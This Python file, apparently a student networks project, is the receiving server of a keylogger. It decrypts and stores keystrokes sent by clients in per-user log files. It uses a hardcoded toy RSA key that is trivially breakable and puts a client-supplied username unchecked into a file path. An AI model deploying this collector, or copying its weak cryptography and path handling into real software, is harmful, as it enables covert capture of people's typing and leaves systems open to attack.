'''
server.py
Kezia Sharnoff

Basics of a TCP connection from Amy Csizmar Dalal CS331 Networks Fall 2025
https://github.com/acdalal/cs331-gopher/blob/main/gopherServer.py

'''

import sys, socket, os
from Crypto.Cipher import AES
from Crypto.Hash import HMAC, SHA256
from Crypto.Random import get_random_bytes

DEFAULT_PORT = 48939

# Server private key
SERVER_n = 19519
SERVER_d = 7871

KEYS_FILE = "server-keyslogged.txt"
CONFIG_FILE = "server_config"


def decodeKey(encodedKey):
	'''
	Turns the bytes into a string, into a list of strings, into a list
	of ints which make up the encrypted key
	'''

	keyString = encodedKey.decode("utf-8")

	keyStrList = keyString.split(" ")

	numList = []

	try:
		for k in keyStrList:
			numList.append(int(k))
	except:
		return []

	return numList


def decryptKey(keyList):
	'''
	Input the list of ints that make up the encrypted key, decrypt it
	using the server's private key and then turn it back into bytes
	to be used by AES.

	Copied from the RSA lab
	'''

	plaintext = []
	for num in keyList:
		decrypted = num**SERVER_d % SERVER_n
		plaintext.append(decrypted)

	aes_key = bytes(plaintext)
	return aes_key


def decryptMessage(data, key):
	'''
	Input the data which is the encrypted message and the AES key, return
	the decrypted and decoded data

	Several things in this function can crash (ciper.decrypt and message.decode)
	so calling this function should always use a try, except

	Taken from:
	https://www.pycryptodome.org/src/examples#encrypt-data-with-aes
	the "Encrypt and authenticate data in one step" section
	'''

	tag = data[0:16]
	nonce = data[16:31]
	ciphertext = data[31:]

	cipher = AES.new(key, AES.MODE_OCB, nonce=nonce)
	message = cipher.decrypt_and_verify(ciphertext, tag)

	return message.decode("utf-8")


def writeKeysToFile(keys, filename):
	'''
	Append the keys inputted to the file
	'''
	try:
		with open(filename, "a") as file:
			file.write(keys)
	except:
		print("FAILED TO WRITE")
		pass


def listen(serverSocket):
	'''
	Upon receiving a connection, get the messages. A successful transaction 
	will have three messages:
	1. AES key, encrypted with the server public key
	2. keys inputted, encrypted with the AES key
	3. (optional) username of client, encrypted with the AES key
	'''

	serverSocket.listen(5)

	while True:
		clientSock, clientAddr = serverSocket.accept()

		try:
			print("Connection received from ",  clientSock.getpeername())
		except:
			print("Connection received from unknown host!")

		data = []

		while True:
			try: 
				msg = clientSock.recv(1024)
			except:
				break

			if not len(msg):
				break

			data.append(msg)

			print("Received message of length:", len(msg))

		try:
			if len(data) < 2:
				continue

			key = data[0]
			decodedKey = decodeKey(key)
			aes_key = decryptKey(decodedKey)

			encryptedMsg = data[1]
			msg = decryptMessage(encryptedMsg, aes_key)

			username = ""

			if len(data) >= 3:
				encryptedUser = data[2]
				username = decryptMessage(encryptedUser, aes_key)
		
			writeKeysToFile(msg, username + KEYS_FILE)
		except Exception as e:
			print(e)
			print("SERVER FAILURE")

		clientSock.close()


def createServer(port):
	'''
	Create a TCP server at the specific port
	'''
	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	server.bind(("", port))
	return server


def getConfigSettings():
	'''
	Get the port from the config file. If the config file was not already
	created or there is some error, return the default port. 
	'''
	if not os.path.exists(CONFIG_FILE):
		print("CONFIG DID NOT EXIST, CREATING...")
		with open(CONFIG_FILE, "w") as file:
			file.write("# This is the server config file\n")
			file.write("port " + str(DEFAULT_PORT))

		return DEFAULT_PORT


	# The port is on a line with the form:
	# port 97843
	# This is to make the config file expandable in the future
	try:
		with open(CONFIG_FILE, "r") as file:
			for line in file:
				line = line.strip()

				if len(line) < 1 or line[0] == "#":
					continue

				content = line.split(" ")

				if len(content) >= 2 and content[0].lower() == "port":
					return int(content[1])

	except:
		return DEFAULT_PORT


def main():
	port = getConfigSettings()

	server = createServer(port)
	print("The server is running! It is at port", port)
	listen(server)


main()